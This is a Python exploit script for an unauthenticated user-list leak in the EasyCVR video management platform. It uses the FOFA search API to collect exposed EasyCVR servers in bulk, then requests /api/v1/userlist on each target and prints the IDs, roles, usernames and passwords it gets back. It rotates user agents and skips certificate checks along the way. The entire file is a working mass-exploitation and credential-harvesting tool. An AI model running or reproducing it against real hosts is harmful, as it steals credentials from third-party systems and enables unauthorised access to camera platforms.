#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import random
import json
import argparse
from tqdm import tqdm
from urllib.parse import unquote

def UA():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 EDGE/16.16299',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
    ]
    random_user_agent = random.choice(user_agents)
    headers = {'User-Agent': random_user_agent}
    return headers

def Target_collection(filename): # 目标收集
    urls = [
        "https://fofa.info/api/v1/search/all?email=xxxxxxxxxxxx&key=xxxxxxxxxxxxxx&qbase64=dGl0bGU9IkVhc3lDVlIi&size=9999" # title="EasyCVR"
        # 自行配置fofa邮箱和api key
    ]

    for url in urls:
        try:
            res = requests.get(url)
            respBody = res.text
            respBody = json.loads(respBody)
            if "results" in respBody:
                with open(filename, "a") as fp:
                    for ioc in respBody["results"]:
                        url = str(ioc[0])
                        if "http" not in url:
                            url = "http://" + str(url)
                        fp.write("{}\n".format(str(url)))
        except Exception as e:
            with open(filename + ".error", "a") as ferrorP:
                ferrorP.write(str(e) + "\n")

def Single_objective_testing(url): # 单目标检测
    url = url + "/api/v1/userlist?pageindex=0&pagesize=10"
    header = UA()
    UPslist = []
    try:
        rqg = requests.get(url, headers=header, verify=False, allow_redirects=False, timeout=2)
        
        if rqg.status_code != 200:
            msg = "{} has no vulnerabilities".format(url)
            return False, msg, ''
        elif rqg.status_code == 200 and "Username" in rqg.text:
            msg = "{} has vulnerabilities".format(url)
            respBody = json.loads(rqg.text)
            for item in respBody["data"]:
                user_id = item["ID"]
                RoleName = item["RoleName"]
                name = item["Name"]
                password = item["Password"]
                UPs = str(user_id) + ":权限:" + str(RoleName) + ",用户名:" + str(name) + ",密码:" + str(password)
                UPslist.append(UPs)
            #print(UPs)
            return True, msg, UPslist
        else:
            msg = "{} has no vulnerabilities".format(url)
            return False, msg, ''
    except requests.Timeout:
        msg = "{} timed out ({} seconds)".format(url, 2)
        return False, msg, ''
    except Exception as e:
        msg = "{} encountered an error: {}".format(url, str(e))
        return False, msg, ''

def Multi_objective_testing(file): # 多目标检查
    with open(file, "r") as f:
        lines = f.readlines()
        for url in tqdm(lines, desc="Checking Progress", position=0, leave=False, ncols=80):
            url = url.strip()
            if "https" not in url:
                flag, msg, UPs = Single_objective_testing(url)
                if flag:
                    for i in range(len(UPs)):
                        UP_s = UPs[i]
                        tqdm.write(str(msg) + "," +str(UP_s))  # 使用 tqdm.write 输出，不打断 tqdm 进度条


def main():
    parser = argparse.ArgumentParser(description="### EasyCVR video management platform has user information leakage. ###")

    parser.add_argument("-t", "--target_collection", action="store_true", help="Perform target collection")
    parser.add_argument("-r", "--multi_objective_testing", metavar="FILE", help="Perform multi-objective testing. e.g:python EasyCVR_information_leakage.py -r ./url.txt")
    parser.add_argument("-u", "--single_objective_testing", metavar="URL", help="Perform single-objective testing. e.g:python EasyCVR_information_leakage.py -u http://xxx.xxx.xxx")


    args = parser.parse_args()

    if args.target_collection:
        Target_collection("./url.txt")
    elif args.multi_objective_testing:
        Multi_objective_testing(args.multi_objective_testing)
    elif args.single_objective_testing:
        flag, msg, UPs = Single_objective_testing(args.single_objective_testing)
        if flag:
            print(str(msg) + "," +str(UPs))
        else:
            print(msg)
    else:
        print("No valid options provided. Use -h for help.")

if __name__ == "__main__":
    main()

